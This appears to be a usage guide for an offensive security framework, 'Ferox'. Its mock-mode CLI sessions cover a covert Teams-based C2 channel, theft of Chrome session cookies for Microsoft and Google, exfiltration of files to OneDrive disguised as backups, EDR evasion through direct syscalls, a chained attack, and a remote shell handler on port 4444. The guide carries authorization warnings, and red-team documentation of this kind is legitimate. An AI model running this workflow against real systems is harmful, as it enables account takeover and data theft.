# Ferox Phase 3 - CLI Usage Examples

This document provides practical examples for using the Phase 3 modules in Ferox.

---

## Example 1: Teams Tunnel C2 Session

### Scenario
Establish a covert C2 channel using Microsoft Teams meetings for command and control.

### Step-by-Step

```bash
# Start Ferox
$ ./ferox

    ███████╗███████╗██████╗  ██████╗ ██╗  ██╗
    ██╔════╝██╔════╝██╔══██╗██╔═══██╗╚██╗██╔╝
    █████╗  █████╗  ██████╔╝██║   ██║ ╚███╔╝
    ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║ ██╔██╗
    ██║     ███████╗██║  ██║╚██████╔╝██╔╝ ██╗
    ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝

ferox v2.0.0 - Ferocious Security Framework

ferox> use c2/teams_tunnel
[*] Loaded module: c2/teams_tunnel v1.0.0

ferox (c2/teams_tunnel)> options
Module Options:
  Name              Current Value    Required    Description
  ----              -------------    --------    -----------
  access_token                       yes         Microsoft Graph API access token
  meeting_title     Q3 Security...   no          Innocuous meeting title
  poll_interval     30               no          Polling interval in seconds
  mock_mode         true             no          Use mock Graph API
  encryption_key                     yes         Password for command encryption
  max_iterations    3                no          Maximum polling iterations

ferox (c2/teams_tunnel)> set access_token mock-token-12345
ferox (c2/teams_tunnel)> set encryption_key MySecurePassword123
ferox (c2/teams_tunnel)> set meeting_title "Monthly Security Review"
ferox (c2/teams_tunnel)> set mock_mode true

ferox (c2/teams_tunnel)> info
Module Information:
  Name:        c2/teams_tunnel
  Version:     1.0.0
  Author:      Ferox Security Team
  Type:        PostExploit
  Category:    c2
  Description: Covert C2 channel using Microsoft Teams meetings and Graph API.
               AUTHORIZED USE ONLY - Requires explicit permission.

ferox (c2/teams_tunnel)> check
[*] Running safety check...
[✓] Check completed
    Status: Mock mode enabled - safe for testing
    Confidence: 0.9

ferox (c2/teams_tunnel)> run
[*] Executing module...
[*] Creating phantom Teams meeting...
[*] Meeting created: Monthly Security Review
[*] Join URL: https://teams.microsoft.com/mock
[*] Starting C2 polling loop (3 iterations)...
[*] Poll 1/3 - No commands
[*] Poll 2/3 - No commands
[*] Poll 3/3 - No commands

[✓] Module execution successful
    Message: Teams Tunnel C2 session completed
    Results:
      meeting_id: mock-meeting-a1b2c3d4
      chat_id: mock-thread-e5f6g7h8
      join_url: https://teams.microsoft.com/mock
      iterations: 3
      duration_secs: 90
```

---

## Example 2: Browser Session Hijacking

### Scenario
Extract session cookies from Chrome browser for Microsoft and Google domains.

```bash
ferox> use post/browser/deep_session_hijack
[*] Loaded module: post/browser/deep_session_hijack v1.0.0

ferox (post/browser/deep_session_hijack)> set browser chrome
ferox (post/browser/deep_session_hijack)> set target_domains *.microsoft.com,*.google.com
ferox (post/browser/deep_session_hijack)> set mock_mode true
ferox (post/browser/deep_session_hijack)> set output_format json

ferox (post/browser/deep_session_hijack)> check
[*] Running safety check...
[✓] Check completed
    Status: Mock mode enabled - safe for testing
    Confidence: 1.0
    Details: Mock mode enabled - safe for testing

ferox (post/browser/deep_session_hijack)> run
[*] Executing module...
[*] Extracting cookies from chrome...
[*] Targeting domains: *.microsoft.com, *.google.com
[*] Using mock mode - no real browser access

[✓] Module execution successful
    Message: Extracted 4 cookies from 2 domains
    Results:
      cookie_count: 4
      target_domains: *.microsoft.com, *.google.com
      browser: chrome
      mock_mode: true
      cookies_json: [
        {
          "domain": ".login.microsoftonline.com",
          "name": "ESTSAUTH",
          "value": "mock_session_token_abc123xyz",
          "path": "/",
          "expires_utc": 1735689600,
          "secure": true,
          "http_only": true
        },
        {
          "domain": ".google.com",
          "name": "SID",
          "value": "mock_google_sid_ghi789",
          "path": "/",
          "expires_utc": 1735689600,
          "secure": true,
          "http_only": false
        },
        ...
      ]

ferox (post/browser/deep_session_hijack)> export json cookies.json
[*] Results exported to cookies.json
```

---

## Example 3: OneDrive Data Exfiltration

### Scenario
Exfiltrate a sensitive file to the victim's OneDrive Backups folder.

```bash
# First, create a test file
$ echo "Sensitive data for testing" > /tmp/test_data.txt

# Start Ferox
$ ./ferox

ferox> use auxiliary/cloud/onedrive_sync_exfil
[*] Loaded module: auxiliary/cloud/onedrive_sync_exfil v1.0.0

ferox (auxiliary/cloud/onedrive_sync_exfil)> options
Module Options:
  Name              Current Value    Required    Description
  ----              -------------    --------    -----------
  oauth_token                        yes         OneDrive OAuth access token
  source_file                        yes         Local file path to exfiltrate
  remote_name                        no          Remote file name
  mock_mode         true             no          Use mock OneDrive API
  rate_limit_ms     1000             no          Delay between uploads (ms)
  backup_folder     Backups          no          OneDrive folder for uploads

ferox (auxiliary/cloud/onedrive_sync_exfil)> set oauth_token mock-token-xyz789
ferox (auxiliary/cloud/onedrive_sync_exfil)> set source_file /tmp/test_data.txt
ferox (auxiliary/cloud/onedrive_sync_exfil)> set remote_name backup_2025_01.txt
ferox (auxiliary/cloud/onedrive_sync_exfil)> set mock_mode true

ferox (auxiliary/cloud/onedrive_sync_exfil)> check
[*] Running safety check...
[✓] Check completed
    Status: Mock mode enabled - safe for testing
    Confidence: 1.0

ferox (auxiliary/cloud/onedrive_sync_exfil)> run
[*] Executing module...
[!] This module requires explicit confirmation (exfiltration operation)
[?] Continue? (yes/no): yes

[*] Uploading file to OneDrive...
[*] Target: Backups/backup_2025_01.txt
[*] Using mock mode - no real upload

[✓] Module execution successful
    Message: Exfiltrated backup_2025_01.txt (26 bytes) to OneDrive in 100ms
    Results:
      file_name: backup_2025_01.txt
      size_bytes: 26
      duration_ms: 100
      onedrive_id: mock-a9b8c7d6
      web_url: https://onedrive.live.com/mock/backup_2025_01.txt
      mock_mode: true
```

---

## Example 4: EDR Detection

### Scenario
Detect EDR products and hooks on the current system.

```bash
ferox> use evasion/edr/silent_shadow
[*] Loaded module: evasion/edr/silent_shadow v1.0.0

ferox (evasion/edr/silent_shadow)> set technique detection_only
ferox (evasion/edr/silent_shadow)> set mock_mode true

ferox (evasion/edr/silent_shadow)> check
[*] Running safety check...
[*] Scanning for EDR products...
[*] Detected: Microsoft Defender (MsMpEng.exe)

[✓] Check completed
    Status: Detected 1 EDR product(s): Microsoft Defender
    Confidence: 0.9
    Fingerprint:
      edr_count: 1
      microsoft_defender: true
      crowdstrike_falcon: false
      sentinelone: false
      carbon_black: false
      cylance: false

ferox (evasion/edr/silent_shadow)> run
[*] Executing module...
[*] Technique: detection_only
[*] Scanning system...

[*] Detected EDR Products:
    - Microsoft Defender (MsMpEng.exe) ✓

[*] Detected Hooks (3):
    - NtCreateFile - hooked by mock_edr.dll
    - NtWriteFile - hooked by mock_edr.dll
    - NtOpenProcess - hooked by mock_edr.dll

[✓] Module execution successful
    Message: Evasion technique 'detection_only' completed successfully
    Results:
      technique: detection_only
      mock_mode: true
      detected_edrs: ["Microsoft Defender"]
      detected_hooks: [
        "NtCreateFile - hooked by mock_edr.dll",
        "NtWriteFile - hooked by mock_edr.dll",
        "NtOpenProcess - hooked by mock_edr.dll"
      ]
```

---

## Example 5: Advanced EDR Evasion (Mock Mode)

### Scenario
Simulate direct syscall evasion technique.

```bash
ferox> use evasion/edr/silent_shadow

ferox (evasion/edr/silent_shadow)> set technique direct_syscall
ferox (evasion/edr/silent_shadow)> set mock_mode true

ferox (evasion/edr/silent_shadow)> info
Module Information:
  Name:        evasion/edr/silent_shadow
  Version:     1.0.0
  Type:        PostExploit
  Category:    evasion/edr
  Description: EDR evasion via direct syscalls and memory unhooking.
               AUTHORIZED USE ONLY - Requires administrator privileges.

ferox (evasion/edr/silent_shadow)> run
[!] This module requires explicit confirmation (evasion operation)
[?] Continue? (yes/no): yes

[*] Executing module...
[*] Technique: direct_syscall
[*] Detecting EDR products...
[*] Found: Microsoft Defender

[*] Applying evasion technique...
[*] [MOCK] Direct syscall simulation - no actual system changes

[✓] Module execution successful
    Message: Evasion technique 'direct_syscall' completed successfully
    Results:
      technique: direct_syscall
      mock_mode: true
      detected_edrs: ["Microsoft Defender"]
      evasion_results: [
        {
          "technique": "Direct Syscall",
          "success": true,
          "details": "[MOCK] Direct syscall simulation - no actual system changes"
        }
      ]
```

---

## Example 6: Chaining Modules

### Scenario
Complete attack chain: EDR detection → Session hijack → Exfiltration

```bash
# Step 1: Check for EDR
ferox> use evasion/edr/silent_shadow
ferox (evasion/edr/silent_shadow)> set technique detection_only
ferox (evasion/edr/silent_shadow)> run
[*] Detected: Microsoft Defender
[*] Detected hooks: 3

# Step 2: Extract browser sessions
ferox> use post/browser/deep_session_hijack
ferox (post/browser/deep_session_hijack)> set mock_mode true
ferox (post/browser/deep_session_hijack)> run
[*] Extracted 4 cookies
ferox (post/browser/deep_session_hijack)> export json /tmp/cookies.json

# Step 3: Exfiltrate via OneDrive
ferox> use auxiliary/cloud/onedrive_sync_exfil
ferox (auxiliary/cloud/onedrive_sync_exfil)> set source_file /tmp/cookies.json
ferox (auxiliary/cloud/onedrive_sync_exfil)> set remote_name system_backup.json
ferox (auxiliary/cloud/onedrive_sync_exfil)> set mock_mode true
ferox (auxiliary/cloud/onedrive_sync_exfil)> run
[✓] Exfiltrated system_backup.json (2.1 KB) to OneDrive
```

---

## Command Reference

### Global Commands
```
modules             - List all available modules
use <module>        - Load a module
back                - Unload current module
help                - Show help
exit/quit           - Exit Ferox
```

### Module Commands
```
info                - Show module information
options             - Show module options
set <name> <value>  - Set an option value
unset <name>        - Clear an option value
check               - Run safety check (non-destructive)
run                 - Execute the module
export <format>     - Export results
```

### Advanced Commands
```
sessions            - List active sessions
handlers            - List active handlers
history             - Show command history
clear               - Clear screen
```

---

## Safety Tips

### 1. Always Start with Mock Mode
```bash
ferox> set mock_mode true
ferox> check  # Verify before running
ferox> run
```

### 2. Use Check Before Run
```bash
ferox> check  # Non-destructive check
# Review results
ferox> run    # Execute if safe
```

### 3. Understand Confirmation Requirements
- **Always requires confirmation:** C2 modules, exfiltration
- **Conditional confirmation:** Post-exploitation (when mock_mode=false)
- **No confirmation:** Detection-only modes

### 4. Review Options Before Execution
```bash
ferox> options  # Review all settings
ferox> info     # Understand the module
```

---

## Troubleshooting

### Module Not Found
```bash
ferox> use c2/teams_tunnel
[!] Module not found: c2/teams_tunnel

# Solution: Check available modules
ferox> modules
```

### Option Validation Error
```bash
ferox> run
[!] Validation error: access_token required

# Solution: Set required options
ferox> set access_token <value>
```

### Permission Denied (Real Mode)
```bash
ferox> set mock_mode false
ferox> run
[!] Permission denied: Requires administrator privileges

# Solution: Run with elevated privileges or use mock mode
```

---

## Production Usage Warning

⚠️ **Before disabling mock mode:**
1. Ensure you have **written authorization**
2. Understand the **legal implications**
3. Verify you're in a **controlled environment**
4. Have a **rollback plan**

```bash
# Production mode checklist
ferox> set mock_mode false
[!] WARNING: Disabling mock mode
[!] This will perform REAL operations
[!] Ensure you have proper authorization
[?] Acknowledge risk? (type 'I UNDERSTAND'): I UNDERSTAND
```

---

## Integration Examples

### With Existing Handlers

```bash
# Create a remote shell first
ferox> handler create remote_shell 0.0.0.0:4444

# Then use C2 module with handler
ferox> use c2/teams_tunnel
ferox> set handler_id <id from above>
```

### With Session Management

```bash
# After exploitation
ferox> sessions
# View active sessions

ferox> session use <id>
# Interact with session

ferox> use post/browser/deep_session_hijack
# Extract from compromised host
```

---

**Remember:** These examples are for authorized testing only. Always obtain proper permission before using these tools.
